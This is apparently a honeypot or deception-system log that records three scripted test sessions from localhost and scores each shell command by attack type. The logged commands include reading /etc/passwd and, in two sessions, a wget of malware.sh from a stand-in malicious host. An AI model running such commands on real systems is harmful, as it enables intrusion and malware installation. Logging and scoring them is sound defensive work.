[2026-07-27 16:37:06] [INFO] IP=127.0.0.1 | SESSION=33617523-f0d0-4ed3-81ab-cdc6f5b49cb6 | TYPE=Reconnaissance | SCORE=20 | CMD=whoami
[2026-07-27 16:37:07] [INFO] IP=127.0.0.1 | SESSION=33617523-f0d0-4ed3-81ab-cdc6f5b49cb6 | TYPE=Reconnaissance | SCORE=20 | CMD=pwd
[2026-07-27 16:37:08] [INFO] IP=127.0.0.1 | SESSION=33617523-f0d0-4ed3-81ab-cdc6f5b49cb6 | TYPE=Unknown | SCORE=5 | CMD=ls -la
[2026-07-27 16:37:08] [INFO] IP=127.0.0.1 | SESSION=33617523-f0d0-4ed3-81ab-cdc6f5b49cb6 | TYPE=Unknown | SCORE=5 | CMD=mkdir test_deception
[2026-07-27 16:37:09] [INFO] IP=127.0.0.1 | SESSION=33617523-f0d0-4ed3-81ab-cdc6f5b49cb6 | TYPE=Directory Navigation | SCORE=10 | CMD=cd test_deception
[2026-07-27 16:37:10] [INFO] IP=127.0.0.1 | SESSION=33617523-f0d0-4ed3-81ab-cdc6f5b49cb6 | TYPE=Credential Enumeration | SCORE=60 | CMD=cat /etc/passwd
[2026-07-27 16:37:11] [INFO] IP=127.0.0.1 | SESSION=33617523-f0d0-4ed3-81ab-cdc6f5b49cb6 | TYPE=Malware Download | SCORE=90 | CMD=wget http://malicious-site.com/malware.sh
[2026-07-27 16:37:48] [INFO] IP=127.0.0.1 | SESSION=c0077ece-82ce-4855-98db-f33308752287 | TYPE=Reconnaissance | SCORE=20 | CMD=whoami
[2026-07-27 16:37:49] [INFO] IP=127.0.0.1 | SESSION=c0077ece-82ce-4855-98db-f33308752287 | TYPE=Reconnaissance | SCORE=20 | CMD=pwd
[2026-07-27 16:37:49] [INFO] IP=127.0.0.1 | SESSION=c0077ece-82ce-4855-98db-f33308752287 | TYPE=Unknown | SCORE=5 | CMD=ls -la
[2026-07-27 16:37:50] [INFO] IP=127.0.0.1 | SESSION=c0077ece-82ce-4855-98db-f33308752287 | TYPE=Unknown | SCORE=5 | CMD=mkdir test_deception
[2026-07-27 16:37:51] [INFO] IP=127.0.0.1 | SESSION=c0077ece-82ce-4855-98db-f33308752287 | TYPE=Directory Navigation | SCORE=10 | CMD=cd test_deception
[2026-07-27 16:37:52] [INFO] IP=127.0.0.1 | SESSION=c0077ece-82ce-4855-98db-f33308752287 | TYPE=Credential Enumeration | SCORE=60 | CMD=cat /etc/passwd
[2026-07-27 16:37:53] [INFO] IP=127.0.0.1 | SESSION=c0077ece-82ce-4855-98db-f33308752287 | TYPE=Malware Download | SCORE=90 | CMD=wget http://malicious-site.com/malware.sh
[2026-07-27 16:38:13] [INFO] IP=127.0.0.1 | SESSION=94bbc2fb-6670-4b4e-a785-69d4e2a048d7 | TYPE=Reconnaissance | SCORE=20 | CMD=whoami
[2026-07-27 16:38:14] [INFO] IP=127.0.0.1 | SESSION=94bbc2fb-6670-4b4e-a785-69d4e2a048d7 | TYPE=Reconnaissance | SCORE=20 | CMD=pwd
[2026-07-27 16:38:15] [INFO] IP=127.0.0.1 | SESSION=94bbc2fb-6670-4b4e-a785-69d4e2a048d7 | TYPE=Unknown | SCORE=5 | CMD=ls -la
[2026-07-27 16:38:15] [INFO] IP=127.0.0.1 | SESSION=94bbc2fb-6670-4b4e-a785-69d4e2a048d7 | TYPE=Unknown | SCORE=5 | CMD=mkdir test_deception
[2026-07-27 16:38:16] [INFO] IP=127.0.0.1 | SESSION=94bbc2fb-6670-4b4e-a785-69d4e2a048d7 | TYPE=Directory Navigation | SCORE=10 | CMD=cd test_deception
[2026-07-27 16:38:17] [INFO] IP=127.0.0.1 | SESSION=94bbc2fb-6670-4b4e-a785-69d4e2a048d7 | TYPE=Credential Enumeration | SCORE=60 | CMD=cat /etc/passwd
